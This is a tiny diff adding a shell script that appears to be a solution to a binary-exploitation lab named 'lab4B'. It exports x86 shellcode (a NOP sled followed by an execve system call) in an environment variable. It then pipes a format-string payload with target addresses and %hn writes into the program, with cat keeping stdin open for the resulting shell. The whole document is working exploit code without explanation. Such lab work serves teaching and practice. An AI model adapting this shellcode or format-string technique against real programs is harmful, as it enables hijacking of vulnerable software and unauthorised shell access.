@@ -1,0 +1,3 @@
+export SHELLCODE=$(python -c 'print "\x90"*16+"\x31\xc9\xf7\xe1\xb0\x0b\xbb\x24\x3a\xf8\xb7\xcd\x80"')
+(python -c 'print "\xb8\x99\x04\x08\xba\x99\x04\x08" + "%63557x%6$hn%51122x%7$hn"'; cat) | ./lab4B
+
